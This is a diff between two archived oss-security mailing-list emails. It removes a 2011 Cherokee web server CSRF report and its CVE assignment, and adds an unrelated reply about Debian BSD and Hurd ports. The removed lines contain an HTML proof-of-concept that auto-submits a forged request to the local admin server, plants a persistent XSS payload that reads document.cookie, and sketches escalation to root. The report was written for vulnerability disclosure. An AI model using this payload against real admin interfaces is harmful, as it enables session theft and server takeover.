@@ -1,72 +1,35 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/06/06/22
-Message-ID: <1034398767.510283.1307389066776.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
-Date: Mon, 6 Jun 2011 15:37:46 -0400 (EDT)
-From: Josh Bressers <bressers@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/04/06/5
+Message-ID: <20110406133016.GX1293@yuggoth.org>
+Date: Wed, 6 Apr 2011 13:30:24 +0000
+From: Jeremy Stanley <fungi@...goth.org>
 To: oss-security@...ts.openwall.com
-Cc: Alvaro Lopez Ortega <alvaro@...ality.com>, coley <coley@...re.org>
-Subject: Re: Security issue in cherokee
+Subject: Re: Closed list
 Content-Type: text/plain; charset=utf-8
 
-As best as I can tell, this is the same request from Jan on 2011-06-02.
+On Tue, Apr 05, 2011 at 10:53:58AM -0600, Vincent Danen wrote:
+> * [2011-04-05 20:18:38 +0400] Solar Designer wrote:
+[...]
+> >I am comfortable about "Apple/FreeBSD/OpenBSD", but not about "etc." -
+> >so we'd be forced to introduce a vouching system (well, maybe we'd be
+> >forced to do that for Linux distros as well...)
+> 
+> "etc" more or less meant the other *BSDs, but I was being lazy.  =)
+> Maybe just NetBSD there.
+[...]
 
-Please use CVE-2011-2191
+Probably worth pointing out, since I didn't see it mentioned
+elsewhere, that these distinctions are not so cut-and-dried as that.
+Debian, for example, is not only a GNU/Linux distribution but also a
+GNU/BSD distribution:
 
-Thanks.
+http://www.debian.org/ports/kfreebsd-gnu/
 
+(...and a GNU/Hurd distribution, though perpetually short of release
+status, and it's not like there are likely enough of those to
+warrant a separate ML of this nature anyway.)
 -- 
-    JB
-
------ Original Message -----
-> A security bug was reported against cherokee in Ubuntu. You are being
-> emailed as the upstream contact. Please keep oss-security[1] CC'd for
-> any updates on this issue.
-> 
-> This issue should be considered public, but has not yet been assigned
-> a
-> CVE. Once a CVE is assigned, please mention it in any changelogs.
-> 
-> Details from the public bug follow:
-> https://launchpad.net/bugs/784632
-> 
-> From the reporter:
-> ----
-> The cherokee admin server is vulnerable to csrf.
-> 
-> Using csrf it is possible to produce a persistent xss in several pages
-> -
-> including the 'status' page via the 'nickname field' of a vserver.
-> An example of this is the following:
-> 
-> <html>
-> <body>
-> <form action="http://127.0.0.1:9090/vserver/apply" method="post"
-> id="xssform">
-> <input type="text" name="tmp!new_droot" value='/var/www/'></input>
-> <input type="text" name="tmp!new_nick" value='" onselect=alert(1)
-> autofocus> <embed src="javascript:alert(document.cookie)">'></input>
-> </form>
-> <script>document.getElementById("xssform").submit();</script>
-> </body>
-> 
-> A Worst case scenario could be something like the following:
-> If a user is logged in and the cherokee admin server is running on
-> localhost:9090 then if they visit a $bad page - the bad page may be
-> able
-> to send requests to the server so as to reconfigure it to:
-> 
-> 1. run as root
-> 2. the logging of error(or access) will run a command ...
-> ----
-> 
-> Thanks in advance for your cooperation in coordinating a fix for this
-> issue,
-> 
-> Jamie Strandboge
-> 
-> [1] oss-security@...ts.openwall.com is a public mailing list for
-> people to collaborate on security vulnerabilities and coordinate
-> security updates.
-> 
-> --
-> Jamie Strandboge | http://www.canonical.com
+{ IRL(Jeremy_Stanley); WWW(http://fungi.yuggoth.org/); PGP(43495829);
+WHOIS(STANL3-ARIN); SMTP(fungi@...goth.org); FINGER(fungi@...goth.org);
+MUD(kinrui@...arsis.mudpy.org:6669); IRC(fungi@....yuggoth.org#ccl);
+ICQ(114362511); YAHOO(crawlingchaoslabs); AIM(dreadazathoth); }
